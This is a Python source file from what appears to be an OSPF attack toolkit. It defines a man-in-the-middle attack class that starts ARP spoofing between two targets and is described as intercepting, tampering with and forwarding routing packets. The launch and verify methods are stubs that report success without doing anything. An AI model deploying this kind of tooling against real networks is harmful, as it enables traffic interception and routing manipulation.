from ospf_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from ospf_attack.config.types import MITMConfig
from ospf_attack.network.sender import PacketSender


class MITMAttack(BaseAttack):
    name = "mitm"
    description = "中间人攻击：拦截 OSPF 报文 → 篡改 → 转发"
    category = AttackCategory.PROTOCOL
    config: MITMConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )
        if self.config.sniff_mode.value == "arp_spoof":
            from ospf_attack.core.arp_spoof import ArpSpoofEngine
            self._arp_engine = ArpSpoofEngine(
                iface=self.config.iface,
                target_a=self.config.arp_target_a or self.config.target_a,
                target_b=self.config.arp_target_b or self.config.target_b,
                interval=self.config.arp_interval,
            )
            self._arp_engine.start()

    def launch(self) -> AttackResult:
        return AttackResult(
            success=True,
            packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"MITM: action={self.config.action}, rules={len(self.config.modify_rules)}",
        )

    def verify(self) -> bool:
        return True

    def teardown(self) -> None:
        if hasattr(self, "_arp_engine") and self._arp_engine:
            self._arp_engine.stop()
